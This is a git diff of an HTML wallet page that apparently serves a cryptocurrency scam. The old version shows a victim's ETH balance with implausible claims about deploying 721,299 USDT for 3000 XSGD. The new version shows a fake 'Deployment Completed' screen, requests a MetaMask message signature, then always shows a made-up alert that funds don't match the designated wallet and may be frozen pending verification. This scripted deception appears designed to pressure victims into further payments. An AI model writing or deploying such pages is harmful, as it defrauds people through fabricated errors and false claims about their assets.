@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Wallet Connect & Signature with Balance & Contract</title>
+<title>Deployment & Sign with Error</title>
 
 <style>
 body {
@@ -54,84 +54,29 @@ button:hover:not(:disabled) {
 <body>
 
 <div class="card">
-    <!-- Logo or Image -->
-    <img src="https://cdn.iconscout.com/icon/free/png-256/metamask-2752174-2284965.png" alt="Wallet Logo" style="width:80px; margin-bottom:10px;">
-    <!-- Status message -->
-    <div id="status">Please connect your wallet to begin.</div>
-    <!-- Connect button -->
-    <button id="connectBtn">Connect Wallet</button>
-    <!-- Contract info message -->
-    <div id="contractInfo" style="margin-top:10px; font-weight: bold; color: #333;"></div>
-    <!-- Sign message button -->
-    <button id="signBtn" disabled>Sign Message</button>
+    <h2>Deployment Completed</h2>
+    <p>Deployment is done successfully.</p>
+    <button id="signBtn">Get Signature</button>
+    <div id="signatureStatus" style="margin-top:15px; color: green;"></div>
 </div>
 
-<!-- Include ethers.js -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
 let provider;
 let signer;
-let currentAddress;
 
-// Elements
-const statusEl = document.getElementById('status');
-const connectBtn = document.getElementById('connectBtn');
 const signBtn = document.getElementById('signBtn');
-const contractInfoEl = document.getElementById('contractInfo');
+const signatureStatus = document.getElementById('signatureStatus');
 
-async function connectWallet() {
+async function signMessage() {
     if (!window.ethereum) {
-        alert("MetaMask or another Ethereum wallet extension is not detected. Please install MetaMask.");
+        alert("Please install MetaMask or another Ethereum wallet extension.");
         return;
     }
     try {
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-        currentAddress = await signer.getAddress();
-
-        const balanceBN = await provider.getBalance(currentAddress);
-        const balanceETH = ethers.utils.formatEther(balanceBN);
-        const balanceNumber = Number(balanceETH);
-
-        // Show balance info
-        statusEl.innerHTML = `
-        <b>Wallet Connected</b><br/>
-        Address: ${currentAddress}<br/>
-        ETH Balance: ${balanceNumber.toFixed(4)} ETH<br/>
-        Waiting for contract deployment balance of 3000 SGD...
-        `;
-
-        // Show contract deployment info
-        contractInfoEl.innerHTML = `
-        For deploying the full amount of 721,299 USDT, it is equivalent to 3000 XSGD.
-        `;
-
-        // Enable sign button
-        signBtn.disabled = false;
-
-    } catch (err) {
-        console.error('Wallet connection error:', err);
-        alert("Failed to connect wallet. Please ensure MetaMask is unlocked and try again.");
-        statusEl.innerHTML = "Error connecting wallet. Please try again.";
-        signBtn.disabled = true;
-    }
-}
-
-async function signMessage() {
-    if (!signer || signBtn.disabled) return;
-
-    try {
-        // Re-check balance before signing
-        const balanceBN = await provider.getBalance(currentAddress);
-        const balanceETH = ethers.utils.formatEther(balanceBN);
-        const balanceNumber = Number(balanceETH);
-
-        if (balanceNumber <= 0) {
-            alert("Balance is zero or invalid, cannot sign message.");
-            signBtn.disabled = true;
-            return;
-        }
 
         const message = `
 This is a demonstration message for signing.
@@ -140,19 +85,24 @@ Time:
 ${new Date().toISOString()}
 
 Note:
-• This does NOT send ETH or make a transaction.
-• This is for demonstration purposes only.
+• Deployment is done.
+• Signature will be generated now.
         `;
 
         const signature = await signer.signMessage(message);
-        statusEl.innerHTML = `<b>Signed Message:</b><br/>${signature}`;
+
+        // Show signature
+        signatureStatus.innerHTML = `<b>Signature:</b> ${signature}`;
+
+        // Show error after signature
+        alert("Signature Error: The source of funds does not match the designated wallet. Warning: There is a reasonable possibility that the assets may be temporarily frozen until the ownership and source of funds are successfully verified.");
+
     } catch (err) {
-        console.error('Signing error:', err);
-        alert("Failed to sign message. Please try again.");
+        console.error(err);
+        alert("Error during signing.");
     }
 }
 
-document.getElementById('connectBtn').onclick = connectWallet;
 document.getElementById('signBtn').onclick = signMessage;
 </script>
 
